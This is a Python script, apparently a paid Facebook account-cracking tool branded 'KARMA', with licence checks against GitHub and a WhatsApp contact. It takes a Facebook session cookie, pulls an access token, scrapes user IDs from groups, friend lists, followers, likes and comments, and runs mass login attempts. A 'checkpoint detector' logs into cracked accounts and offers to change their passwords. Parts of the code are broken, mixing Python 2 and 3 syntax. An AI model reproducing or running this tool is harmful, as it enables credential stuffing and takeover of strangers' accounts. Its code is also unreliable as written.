# -*- coding: utf-8 -*-
import os
try:
    import requests
except ImportError:
    print('\n [×] Modul requests belum terinstall!...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [×] Modul Futures belum terinstall!...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [×] Modul Bs4 belum terinstall!...\n')
    os.system('pip install bs4')
def main_apv():
    imt = '~~KARMA=='
    os.system('clear')
    try:
        key1 = open('/sdcard/Pictures/.1.txt', 'r').read()
    except IOError:
        os.system('clear')
        print logo
        print '           THIS IS YOUR KEY BITCH'
        print ''
        myid = uuid.uuid4().hex[:18]
        print '          YOUR KEY : ' + myid + imt
        kok = open('/sdcard/Pictures/.1.txt', 'w')
        kok.write(myid + imt)
        kok.close()
        print ''
        print ''
        raw_input('      Copy Key And Press Enter For Approvel Your Key ')
        os.system('xdg-open https://wa.me/+2348110044418')

    r1 = requests.get('https://raw.githubusercontent.com/Karma-kh3n/Bypass/main/Karma.txt').text
    if key1 in r1:
        main()
    else:
        os.system('clear')
        print '          THIS IS YOUR KEY BRO'
        print ''
        print '          YOUR KEY : ' + key1
        print ''
        raw_input('      Copy Key And Press Enter For Approvel Your Key ')
        os.system('xdg-open https://wa.me/+2348110044418')


import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, threading, itertools
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from bs4 import BeautifulSoup
def xoshnaw():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  print("\x1b[37;1mYOUR ID : "+id)
  try:
    httpCaht = requests.get("https://raw.githubusercontent.com/Karma-kh3n/lapid/main/lipid").text
    if id in httpCaht:
      print("\033[1;92mYOUR ID IS ACTIVE...!")
      msg = str(os.geteuid())
      time.sleep(0.3)
      pass
    else:
      print("\x1b[1;91mID ACTIVATE (telegram) INBOX  @Karma428")
      os.system('xdg-open https://wa.me/+2348110044418')
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
    if name == '__main__':
    	print(logo)
    	xoshnaw()
xoshnaw()
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
#  Moch Yayan Juan Alvredo XD.  #
#------------------------------->

############################ RESPONSE FACEBOOK ###########################################
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,pwBaru=[],[]
ok = []
cp = []
id = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
###########################################################################################
done = False
def animate():
    os.system("clear")
    for c in itertools.cycle(['\x1b[1;92m|', '\x1b[1;92m/', '\x1b[1;92m-', '\x1b[1;92m\\']):
        if done:
            break
        sys.stdout.write(f'\r{N}[{O}•{N}] Loading ' + c)
        sys.stdout.flush()
        time.sleep(0.03)
t = threading.Thread(target=animate)
t.start()
time.sleep(0.5)
done = True

# lempankkkkkkkk
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

# LO KONTOL
def logo():
    print("""%s
.____/\ .______  .______  ._____.___ .______  
:   /  \:      \ : __   \ :         |:      \ 
|.  ___/|   .   ||  \____||   \  /  ||   .   |
|     \ |   :   ||   :  \ |   |\/   ||   :   |
|      \|___|   ||   |___\|___| |   ||___|   |
|___\  /    |___||___|          |___|    |___|
     \/                                       
                                              
                                                                           """%(M))
#CRACK SELESAI
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print('\n\n %s[%s#%s] CRACK COMPLETED...\n'%(N,K,N))
        print(' [%s+%s] KARMA OK : %s%s%s'%(N,M,N,str(len(ok)),M))
        print(' [%s+%s] KARMA CP : %s%s%s'%(N,M,N,str(len(cp)),M))
        cek_cp = input(f"\n [{O}?{N}] BRING UP THE CHECKPOINT DETECTOR OPTION [Y/t]: ")
        if cek_cp =="":
            print(f"\n [{M}!{N}] DONT EMPTY");hasil(ok,cp)
        elif cek_cp in["Y","y"]:
            jalan(f" [{M}!{N}] TURN ON AIRPLANE MODE FOR 8 SEC.");time.sleep(5)
            ww=input(f"\n [{O}?{N}] CHANGE PASSWORD WHEN Tap Yes[Y/t]: ")
            if ww in ("Y","y","ya"):
                ubahP.append("y")
                print(f" [{H}•{N}] PASSWORD : {H}Karma428{N}")
                pwBar=input(f"\n [{H}+{N}] ENTER NEW PASSWORD : ")
                print("\n")
                if len(pwBar) <= 5:
                    print('\n %s[%s×%s] PASSWORD MUST ATLEAST BE 6 CHARACTERS'%(N,M,N))
                else:
                    pwBaru.append(pwBar)
            for memek in cp:
                kontol = memek.replace('\n', '')
                titid  = kontol.split('|')
                jalan(f' {N}[{M}>{N}] TRY TO LOGIN TO ACCOUNT : {K}{kontol.replace(" [×] ", "")}{N}')
                try:
                    log_hasil(titid[0].replace(" [×] ", ""), titid[1])
                except requests.exceptions.ConnectionError:
                    continue
                print("")
            print("")
            print('   [ %sCHECKING PROCESS COMPLETED %s]\n'%(H,N));exit()
        elif cek_cp in["T","t"]:
            exit(f"\n  {O}*{N} GOOD BYE:)")
        else:
            print(f"\n [{M}!{N}] Y/t STUPID");hasil(ok,cp)
    else:
        print('\n\n [%s➣%s] OOPS YOU GOT NO RESULT :('%(M,N));exit()

#MASUK TOKEN
def yayanxd():
    os.system('clear')
    r=requests.Session()
    print(f'{O} *{N} UPDATED 3RD MARCH 2022')
    cookie = input("\n %s[%s?%s] COOKIE : %s"% (N,K,N,O))
    if cookie in['OPEN','Open','open']:
      jalan("\n  %s* %MESSAGE ADMIN KARMA"%(O,H));time.sleep(3);os.system('xdg-open https://wa.me/+2348110044418');yayanxd()
    try:
        data = r.get("https://business.facebook.com/business_locations", headers = {
        "user-agent"                : "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36",
        "referer"                   : "https://www.facebook.com/",
        "host"                      : "business.facebook.com",
        "origin"                    : "https://business.facebook.com",
        "upgrade-insecure-requests" : "1",
        "accept-language"           : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "cache-control"             : "max-age=0",
        "accept"                    : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "content-type"              : "text/html; charset=utf-8"
        }, cookies = {
        "cookie"                    : cookie
        })
        find_token = re.search("(EAAG\w+)", data.text)
        open('.cokie.txt', 'a').write(cookie)
        open('.token.txt', 'a').write(find_token.group(1))
        nama = r.get('https://graph.facebook.com/me?access_token=%s'%(find_token.group(1))).json()['name']
        print('\n\n %s*%s FOOL WELCOME  %s%s%s'%(O,N,K,nama,N));time.sleep(2)
        print(' %s*%s PLEASE USE THIS SC PROPERLY. WE ARE NOT RESPONSIBLE IF THIS SC IS MISUSED...'%(O,N));time.sleep(2)
        input(' %s*%s PRESS ENTER '%(O,N))
        os.system('xdg-open https://wa.me/+2348110044418')
        moch_yayan()
    except AttributeError:
        print('\n %s[%s×%s] COOKIE INVALID'%(N,M,N));time.sleep(1);yayanxd()
    except UnboundLocalError:
        print('\n %s[%s×%s] COOKIE INVALID'%(N,M,N));time.sleep(1);yayanxd()
    except requests.exceptions.ConnectionError:
        exit('\n\n %s[%s!%s] NO CONNECTION\n'%(N,M,N))
### ORANG GANTENG ###
def moch_yayan():
    os.system('clear')
    logo()
    try:
        key = open('/data/data/com.termux/.henceut.txt', 'r').read()
        req = requests.get(f"https://apikey.yayanxd.my.id/check.php?key={key}", headers={"user-agent":"Mozilla/5.0 (Linux; Android 9; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36"}, timeout=10).json()
        mail = req['email']
        bergabung = req['join']
        kadaluarsa = req['expired']
        tod = req['pay_key'].replace("Premium", "\x1b[1;92mKARMA PAID\x1b[0m").replace("Trial", "\x1b[1;91mFREE\x1b[0m")
        todz = req['pay_key']
        notice = req['text']
        statuz = req["status"]
        if statuz == 'kadaluarsa':
            register()
    except (KeyError,IOError):
        print("\n %s[%s➣%s] LISENCE INVALID"%(N,M,N));time.sleep(2);cek_key()
    ipm = requests.get(url_ip).json()
    IP = ipm["origin"]
    print("\n [➣] KARMA EMAIL       : %s"%(mail));time.sleep(0.03)
    print(f" [➣] REGISTRATION      : {bergabung}");time.sleep(0.03)
    print(" [➣] ---------------------------------------------");time.sleep(0.03)
    print(f" [➣] DEMON             : {tod}")
    print(f" [➣] EXPIRY            : {kadaluarsa} {N}{notice}{M}");time.sleep(0.03)
    print(" [➣] ---------------------------------------------");time.sleep(0.03)
    print(" [➣] IP                : %s\n"%(IP));time.sleep(0.03)
    try:
        tokenz = open('.token.txt', 'r').read()
    except IOError:
        print('\n %s[%s➣%s] COOKIE INVALID'%(N,M,N));time.sleep(2);os.system('rm -rf .token.txt');os.system('rm -rf .cokie.txt');yayanxd()
    try:
        nama = requests.get(f'https://graph.facebook.com/me?fields&access_token={tokenz}').json()["name"]
    except KeyError:
        print('\n %s[%s➣%s] COOKIE INVALID'%(N,M,N));time.sleep(2);os.system('rm -rf .token.txt');os.system('rm -rf .cokie.txt');yayanxd()
    except requests.exceptions.ConnectionError:
        exit('\n\n %s[%s➣%s] NO CONNECTION\n'%(N,M,N))
    cookiz = open('.cokie.txt').read()
    kueh  = {"cookie":cookiz}
    print(" [ WELCOME %s%s%s ]\n"%(N,nama,M));time.sleep(0.03)
    print(' [%s01%s]. BUNGLING FROM GROUP V1'%(N,M));time.sleep(0.03)
    print(' [%s02%s]. BUNGLING FROM PUBLIC /LIST [RECOMMENDED]'%(N,M));time.sleep(0.03)
    print(' [%s03%s]. BUNGLING FROM FOLLOWERS V1'%(N,M));time.sleep(0.03)
    print(' [%s04%s]. BUNGLING FROM LIKES V1'%(N,M));time.sleep(0.03)
    print(' [%s05%s]. BUNGLING FROM MULTI CRACK'%(N,M));time.sleep(0.03)
    print(' [%s06%s]. BUNGLING FROM POST'%(N,M));time.sleep(0.03)
    print(' [%s07%s]. CYBORG CHECKPOINT'%(N,M));time.sleep(0.03)
    print(' [%s08%s]. REVAMPING USER AGENT'%(N,M));time.sleep(0.03)
    print(' [%s09%s]. CHECK BUNGLING RESULT'%(N,M));time.sleep(0.03)
    print(' [%s10%s]. MESSAGE %s KARMA%s'%(N,M,N,M));time.sleep(0.03)
    print(' [%s00%s]. logout (%s cookie%s)'%(N,M,N,M));time.sleep(0.03)
    pepek = input('\n [%s➣%s] KARMA : '%(N,M))
    if pepek == '':
        print('\n %s[%s➣%s] jangan kosong kentod!'%(N,M,N));time.sleep(2);moch_yayan()
    elif pepek in['1','01']:
        if todz == 'Trial':
            jalan(f"\n{N} [{N}×{M}] anda adalah user trial cuma bisa menggunakan menu nomor {M}02.{N} upgrade ke premium untuk menikmati semua fiture...");exit()
        else:
            kontol = input(f"{N} [?] masukkan id grup : ")
            if kontol in[""," "]:
                print('\n %s[%s×%s] jangan kosong kentod!'%(N,M,N));time.sleep(2);moch_yayan()
            else:
                try:
                    ajg=requests.get(f"https://mbasic.facebook.com/browse/group/members/?id={kontol}",cookies=kueh).text
                    if "Halaman Tidak Ditemukan" in ajg:
                        print(f"\n %s[%s×%s] group dengan id {kontol} tidak ditemukan"%(N,M,N));time.sleep(2);moch_yayan()
                    elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
                        print("\n %s[%s×%s] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun"%(N,M,N));time.sleep(2);moch_yayan()
                    elif "Konten Tidak Ditemukan" in ajg:
                        print(f"\n %s[%s×%s] group dengan id {kontol} tidak ditemukan"%(N,M,N));time.sleep(2);moch_yayan()
                    else:
                        print(" [*] nama grup : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0][8:])
                        print("\n [!] untuk berhenti tekan CTRL lalu tekan c di keyboard anda.")
                        crack_grup(f"https://mbasic.facebook.com/browse/group/members/?id={kontol}")
                except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                    exit("\n [!] Kesalahan Pada Koneksi")
    elif pepek in['2','02']:
        if todz == 'Trial':
            try:
                jalan(f"{N} [{M}+{N}] user trial cuma bisa mengambil {M}1000{N} id...")
                print("\n [➣] TYPE'me'TO CRACK FROM FRIEND LIST")
                user = input(' [➣] FOOL INPUT FB ID : ')
                _memek_ = __convert__(user)
                r = requests.get(f"http://graph.facebook.com/{_memek_.get('_kontol_')}?fields=friends.fields(id,name).limit(1000)&access_token={tokenz}").json()["friends"]
                for x in r["data"]:
                    id.append(x['id'] + '<=>' + x['name'])
            except KeyError:
                print('\n %s[%s➣%s] FOOL FB ID NOT PUBLIC'%(N,M,N));time.sleep(3);moch_yayan()
        else:
            try:
                print("\n [➣] TYPE 'me' TO CRACK FROM FRIEND LIST")
                user = input(' [➣] FOOL INPUT FB ID : ')
                _memek_ = __convert__(user)
                r = requests.get(f"https://graph.facebook.com/{_memek_.get('_kontol_')}?fields=friends.fields(id,name)&access_token={tokenz}").json()["friends"]
                for x in r["data"]:
                    id.append(x['id'] + '<=>' + x['name'])
            except KeyError:
                print('\n %s[%s×%s] gagal mengambil id, kemungkinan id tidaklah publik'%(N,M,N));time.sleep(3);moch_yayan()
    elif pepek in['3','03']:
        if todz == 'Trial':
            jalan(f"\n{N} [{M}×{N}] anda adalah user trial cuma bisa menggunakan menu nomor {M}02.{N} upgrade ke premium untuk menikmati semua fiture...");exit()
        else:
            kontol = input(f"{N} [?] masukan id atau username followers : ")
            if kontol in[""," "]:
                print('\n %s[%s×%s] jangan kosong kentod!'%(N,M,N));time.sleep(2);moch_yayan()
            try:
                print("\n [!] untuk berhenti tekan CTRL lalu tekan c di keyboard anda.")
                followers(f"https://mbasic.facebook.com/subscribe/lists/?id={kontol}")
            except KeyError:
                print(f"\n [!] Why {kontol} mikir dong tolol, masukin id postingan yang bener ngentod");time.sleep(2);moch_yayan()
    elif pepek in['4','04']:
        if todz == 'Trial':
            jalan(f"\n{N} [{M}×{N}] anda adalah user trial cuma bisa menggunakan menu nomor {M}02.{N} upgrade ke premium untuk menikmati semua fiture...");exit()
        else:
            kontol = input(f"{N} [?] masukan id postingan : ")
            if kontol in[""," "]:
                print('\n %s[%s×%s] jangan kosong kentod!'%(N,M,N));time.sleep(2);moch_yayan()
            try:
                print("\n [!] untuk berhenti tekan CTRL lalu tekan c di keyboard anda.")
                like_post(f"https://mbasic.facebook.com/ufi/reaction/profile/browser/?ft_ent_identifier={kontol}")
            except KeyError:
                print(f"\n [!] Why {kontol} mikir dong tolol, masukin id postingan yang bener ngentod");time.sleep(2);moch_yayan()
    elif pepek in['5','05']:
        if todz == 'Trial':
            jalan(f"\n{N} [{M}×{N}] anda adalah user trial cuma bisa menggunakan menu nomor {M}02.{N} upgrade ke premium untuk menikmati semua fiture...");exit()
        else:
            _ngocok_(tokenz)
    elif pepek in['6','06']:
        if todz == 'Trial':
            jalan(f"\n{N} [{M}×{N}] anda adalah user trial cuma bisa menggunakan menu nomor {M}02.{N} upgrade ke premium untuk menikmati semua fiture...");exit()
        else:
            kontol = input(f"{N} [?] masukan id postingan : ")
            if kontol in[""," "]:
                print('\n %s[%s×%s] jangan kosong kentod!'%(N,M,N));time.sleep(2);moch_yayan()
            try:
                print("\n [!] untuk berhenti tekan CTRL lalu tekan c di keyboard anda.")
                ngomen_post(f"https://mbasic.facebook.com/{kontol}")
            except KeyError:
                print(f"\n [!] Why {kontol} mikir dong tolol, masukin id postingan yang bener ngentod");time.sleep(2);moch_yayan()
    elif pepek in['7','07']:
        if todz == 'Trial':
            jalan(f"\n{N} [{M}×{N}] anda adalah user trial cuma bisa menggunakan menu nomor {M}02.{N} upgrade ke premium untuk menikmati semua fiture...");exit()
        else:
            gabut()
    elif pepek in['8','08']:
        seting_yntkts()
    elif pepek in['9','09']:
        dirs = os.listdir("results")
        print('\n [ hasil crack yang tersimpan di file anda ]\n')
        for file in dirs:
            print(" [%s+%s] %s"%(O,N,file))
        file = input("\n [%s?%s] masukan nama file :%s "%(M,N,H))
        if file == "":
            file = input("\n %s[%s?%s] masukan nama file :%s %s"%(N,M,N,H,N))
        total = open("results/%s"%(file)).read().splitlines()
        print(" %s[%s#%s] --------------------------------------------"%(N,O,N));time.sleep(2)
        nm_file = ("%s"%(file)).replace("-", " ")
        hps_nm  = nm_file.replace(".txt", "").replace("OK", "").replace("CP", "").replace("cp_detektor", "").replace("invalid_ok", "")
        jalan(" [%s*%s] Hasil %scrack%s pada tanggal %s:%s%s%s total %s: %s%s%s"%(M,N,O,N,M,O,hps_nm,N,M,O,len(total),O))
        print(" %s[%s#%s] --------------------------------------------"%(N,O,N));time.sleep(2)
        for memek in total:
            kontol = memek.replace("\n","")
            titid  = kontol.replace(" [✓] "," \x1b[0m[\x1b[1;92m✓\x1b[0m]\x1b[1;92m ").replace(" [×] ", " \x1b[0m[\x1b[1;93m×\x1b[0m]\x1b[1;93m ")
            print("%s%s"%(titid,N));time.sleep(0.03)
        print(" %s[%s#%s] --------------------------------------------"%(N,O,N))
        input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()
    elif pepek in['10']:
        jalan(f"\n {H}  >>> Dapatkan user premium untuk menikmati semua fiture!!<<<{N}\n")
        upd = input(" [?] FOOL UPGRADE TO PREMIUM [Y/t]: ")
        if upd =="":
            exit(f"{N}[{M}×{N}] Y/t memek!")
        elif upd in["Y","y"]:
            jalan("\n %s* %sAnda akan di alihkan ke whatsapp..."%(O,H));time.sleep(0.02)
            os.system('xdg-open https://wa.me/+2348110044418?text=KARMA+DAVID+BELI+LISENSINYA+DOOONG...........???');time.sleep(2);exit()
        elif upd in["T","t"]:
            jalan(f"{B} Good byee:)");exit()
        else:
            exit(f"{N}[{M}×{N}] Y/t memek!")
    elif pepek in['0','00']:
        print("")
        titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
        for x in titik:
            sys.stdout.write('\r %s[%s+%s] menghapus cookie %s'%(N,M,N,x)); sys.stdout.flush()
            time.sleep(1)
        os.system('rm -rf .token.txt');os.system('rm -rf .cokie.txt')
        exit('\n %s[%s✓%s]%s berhasil menghapus cookie'%(N,M,N,H))
    else:
        print('\n %s[%s×%s] menu [%s%s%s] tidak ada, cek menu nya bro!'%(N,M,N,M,pepek,N));time.sleep(2);moch_yayan()
    return __crack__().plerr(id)


### GANTI USER AGENT
def seting_yntkts():
    print('\n (%s1%s) CHANGE USER AGENT'%(O,H))
    print(' (%s2%s) CHECK USER AGENT'%(O,H))
    ytbjts = input('\n %s[%s➣%s] CHOOSE: '%(O,H,O))
    if ytbjts == '':
        print('\n %s[%s×%s] Gak boleh kosong Kentod'%(N,M,N));time.sleep(2);seting_yntkts()
    elif ytbjts in['1','01']:
        yo_ndak_tau_ko_tanya_saia()
    elif ytbjts in['2','02']:
        try:
            user_agent = open('.YNTKTS.txt', 'r').read()
        except IOError:
            user_agent = '%s-'%(M)
        print('\n %s[%s+%s] User Agent anda : %s%s'%(N,O,N,H,user_agent))
        input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
    else:
        print('\n %s[%s×%s] input yang bener'%(N,M,N));time.sleep(2);seting_yntkts()

# USER AGENT BARU
def yo_ndak_tau_ko_tanya_saia():
    os.system('rm -rf .YNTKTS.txt')
    _asu_ = input('\n [%s?%s] ingin menggunakan user agent hp anda [Y/t]: '%(O,N))
    if _asu_ == '':
        print('\n %s[%s×%s] Gak boleh kosong Kentod'%(N,M,N));yo_ndak_tau_ko_tanya_saia()
    elif _asu_ in['Y','y']:
        jalan('\n %s *%s anda akan di arakan ke situs web setelah di arahkan ke situs web.\n  %s*%s klik ikon %sMY USER AGENT%s lalu copy semua user agent anda...'%(O,N,O,N,H,N));time.sleep(2);os.system('xdg-open https://www.yayanxd.my.id/server')
        _agen_ = input(' [%s?%s] masukan user agent hp anda :%s '%(O,N,H))
        open('.YNTKTS.txt', 'w').write(_agen_);time.sleep(2)
        jalan('\n %s[%s✓%s] berhasil menggunakan user agent hp anda...'%(N,H,N))
        input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
    elif _asu_ in['T','t']:
        _agen_ = input(' [%s?%s] masukan user agent :%s '%(O,N,H))
        open('.YNTKTS.txt', 'w').write(_agen_);time.sleep(2)
        jalan('\n %s[%s✓%s] berhasil mengganti user agent...'%(N,H,N))
        input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
    else:
        print('\n %s[%s!%s] Y/t ngentod'%(N,M,N));yo_ndak_tau_ko_tanya_saia()

# CRACK DARI GRUP
def crack_grup(hencet):
    try:
        cookiz = open('.cokie.txt').read()
        kueh  = {"cookie":cookiz}
        kontol=requests.get(hencet,cookies=kueh).text
        memek=re.findall('\<h3\>\<a\ class\=\"..\"\ href\=\"\/(.*?)\"\>(.*?)<\/a\>',kontol)
        for softek in memek:
            if "profile.php?" in softek[0]:
                id.append(re.findall("id=(.*)",softek[0])[0]+"<=>"+softek[1])
            else:
                id.append(softek[0]+"<=>"+softek[1])
            sys.stdout.write('\r [*] sedang mengumpulkan %s id... '%(len(id))); sys.stdout.flush()
        if "Lihat Selengkapnya" in kontol:
            crack_grup(url_mb+BeautifulSoup(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
        else:
            def geh(gey):
                a=requests.get(gey,cookies=kueh).text
                b=re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.*?)</a\>\</strong\>',a)
                if len(b)!=0:
                    for c in b:
                        if "profile.php" in c[0]:
                            d=re.search("profile.php\?id=(\\d*)",c[0]).group(1)
                            if d in id:
                                continue
                            else:
                                id.append(d+"<=>"+c[1])
                        else:
                            d=re.search("(.*?)\?refid",c[0]).group(1)
                            if d in id:
                                continue
                            else:
                                id.append(d+"<=>"+c[1])
                        sys.stdout.write('\r [*] sedang mengumpulkan %s id... '%(len(id))); sys.stdout.flush()
                if "Lihat Postingan Lainnya" in a:
                    geh(url_mb+BeautifulSoup(a,"html.parser").find("a",string="Lihat Postingan Lainnya").get("href"))
            geh(f"{url_mb}/groups/"+re.search("id=(\\d*)",hencet).group(1))
    except:pass
# CRACK LIKE POSTINGAN
def like_post(hencet):
    try:
        cookiz = open('.cokie.txt').read()
        kueh  = {"cookie":cookiz}
        kontol=requests.get(hencet,cookies=kueh).text
        if "Semua 0" in kontol:
            print("\n [!] Tidak ada yang menanggapi postingan, awokawokawok kasian akun nya sepi:v");time.sleep(2);moch_yayan()
        else:
            memek=re.findall('\<h3\ class\=\".."\>\<a\ href\=\"(.*?)"\>(.*?)<\/a\>',kontol)
            for softek in memek:
                if "profile.php?" in softek[0]:
                    id.append(re.findall("id=(.*)",softek[0])[0]+"<=>"+softek[1])
                else:
                    id.append(re.findall("/(.*)",softek[0])[0]+"<=>"+softek[1])
                sys.stdout.write('\r [*] sedang mengumpulkan %s id... '%(len(id))); sys.stdout.flush()
            if "Lihat Selengkapnya" in kontol:
                like_post(url_mb+BeautifulSoup(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
    except:pass
# CRACK FOLLOWERS
def followers(hencet):
    try:
        cookiz = open('.cokie.txt').read()
        kueh  = {"cookie":cookiz}
        kontol=requests.get(hencet,cookies=kueh).text
        memek = BeautifulSoup(kontol,'html.parser')
        for mmk in memek.find_all('a',href=True):
            if "profile.php" in mmk.get('href'):
                bb = mmk.text
                xd = "".join(bs4.re.findall("profile\.php\?id=(.*?)&",mmk.get("href")))
                id.append(bb+'<=>'+xd+'\n')
            sys.stdout.write('\r [*] sedang mengumpulkan %s id... '%(len(id))); sys.stdout.flush()
        for asu in memek.find_all('a',href=True):
            if 'Lihat Selengkapnya' in asu.text:
                followers("https://mbasic.facebook.com/subscribe/lists/?id="+asu.get("href"))
    except:pass
# CRACK KOMENTAR POSTINGAN
def ngomen_post(hencet):
    try:
        cookiz = open('.cokie.txt').read()
        kueh  = {"cookie":cookiz}
        kontol= requests.get(hencet,cookies=kueh,headers=header_grup).text.encode("utf-8")
        memek = BeautifulSoup(kontol,'html.parser')
        for mmk in memek.find_all('h3'):
            for _id_ in mmk.find_all('a',href=True):
                if "profile.php" in _id_.get("href"):
                    xz = _id_.get("href").split('=')[1]
                    bb = xz.split('&')[0]
                    xd = _id_.text
                    id.append(bb+'<=>'+xd+'\n')
                else:
                    xz = _id_.get("href").split('?')[0]
                    bb = xz.split('/')[1]
                    xd = _id_.text
                    id.append(bb+'<=>'+xd+'\n')
                sys.stdout.write('\r [*] sedang mengumpulkan %s id... '%(len(id))); sys.stdout.flush()
        for asu in memek.find_all("a",href=True):
            if "Lihat komentar lainnya…" in asu.text:
                ngomen_post("https://mbasic.facebook.com/"+asu.get("href"))
    except:pass
# CRACK ID RANDOM
def _ngocok_(__ppk__):
    try:
        nanya_keun = int(input('\n [%s➣%s] TOTAL TARGET INPUT : '%(M,N)))
    except:nanya_keun=1
    print(" [%s➣%s] TYPE'me' TO CRACK FROM YOUR FRIND LIST\n"%(O,N))
    for mnh in range(nanya_keun):
        mnh +=1
        user = input(' [%s➣%s] FOOL FB USERNAME %s%s%s : '%(O,N,H,mnh,N))
        _memek_ = __convert__(user)
        try:
            r = requests.get(f"https://graph.facebook.com/{_memek_.get('_kontol_')}?fields=friends.fields(id,name)&access_token={__ppk__}").json()["friends"]
            for x in r["data"]:
                id.append(x['id'] + '<=>' + x['name'])
        except (KeyError,IOError):
            print('\n [×] Id Not Public Fool');time.sleep(3);moch_yayan()
# USERNAME CONVERT TO ID
def __convert__(user):
    if user == "me":
        return {"_kontol_":user}
    else:
        payload = {"fburl": "https://m.facebook.com/{}".format(user), "check": "Lookup"}
        if "facebook" in user:
            payload = {"fburl": user, "check": "Lookup"}
        mmk = requests.post(url_lookup, data=payload).content
        xxx = BeautifulSoup(mmk, "html.parser")
        idt = xxx.find("span", id="code")
        asw = idt.text
        return {"_kontol_":asw}
# CHEKER AKUN CHECKPOINT
def gabut():
    dirs = os.listdir("results")
    print('\n [ hasil crack yang tersimpan di file anda ]\n')
    for file in dirs:
        print(" [%s+%s] %s"%(O,H,file))
    jalan(f" [{M}×{N}] sebelum memasukan file,hidupkan mode pesawat 3 detik.");time.sleep(5)
    files = input("\n [%s?%s] masukan nama file : %s"%(M,N,H))
    try:
        buka_baju = open(f'results/{files}','r').readlines()
    except IOError:
        print('\n [!] file tidak ada');time.sleep(2);moch_yayan()
    ww=input(f"\n {N}[{O}?{N}] ubah password ketika tap yes [Y/t]: ")
    if ww in ("Y","y","ya"):
        ubahP.append("y")
        print(f" [{H}•{N}] contoh password : {H}KARMA428{N}")
        pwBar=input(f"\n [{H}+{N}] masukan password baru : ")
        if len(pwBar) <= 5:
             print('\n %s[%s×%s] kata sandi minimal 6 karakter'%(N,M,N))
        else:
            pwBaru.append(pwBar)
    print('%s [%s*%s] Total %s%s%s Akun'%(N,O,N,K,str(len(buka_baju)),N))
    jalan(" %s[%s#%s] --------------------------------------------"%(N,O,N))
    for memek in buka_baju:
        kontol = memek.replace('\n', '')
        titid  = kontol.split('|')
        jalan(f' {N}[{M}>{N}] mencoba login ke akun : {K}{kontol.replace(" [×] ", "")}{N}')
        try:
            log_hasil(titid[0].replace(" [×] ", ""), titid[1])
        except requests.exceptions.ConnectionError:
            continue
        print("")
    print("")
    print('   [ %sProses Pengecekan Selesai %s]\n'%(H,N))
    input(' [ %sKEMBALI%s ] '%(O,H));os.system(f"rm -rf {buka_baju}");moch_yayan()

# CHEKPOINT DETEDTOR
def log_hasil(user, pasw):
    global aman,cp,salah
    session=requests.Session()
    session.headers.update({
        "Host":"mbasic.facebook.com",
        "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "accept-encoding":"gzip, deflate",
        "accept-language":"id-ID,id;q=0.9",
        "referer":"https://mbasic.facebook.com/",
        "user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
    })
    soup=BeautifulSoup(session.get(url_mb+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
    link=soup.find("form",{"method":"post"})
    for x in soup("input"):
        data.update({x.get("name"):x.get("value")})
    data.update({"email":user,"pass":pasw})
